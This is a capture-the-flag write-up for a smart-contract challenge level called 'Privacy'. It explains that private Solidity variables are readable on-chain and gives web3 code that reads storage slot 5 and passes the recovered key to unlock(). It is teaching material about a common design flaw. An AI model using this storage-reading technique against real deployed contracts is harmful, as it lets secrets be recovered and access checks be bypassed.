Level 12: Privacy

Objective:

Unlock the contract by getting access to a private password.

Vulnerability:

Storage layout .

Explanation:

Even private variables are stored publicly on the blockchain and can be accessed with getStorageAt.

Solution:

let slot5 = await web3.eth.getStorageAt(contract.address, 5)
let key = slot5.slice(0, 34) // First 16 bytes of slot
await contract.unlock(key)

Key Takeaways:

Private variables are only compiler-enforced, not blockchain-hidden.
Use tools like getStorageAt to analyze raw storage.
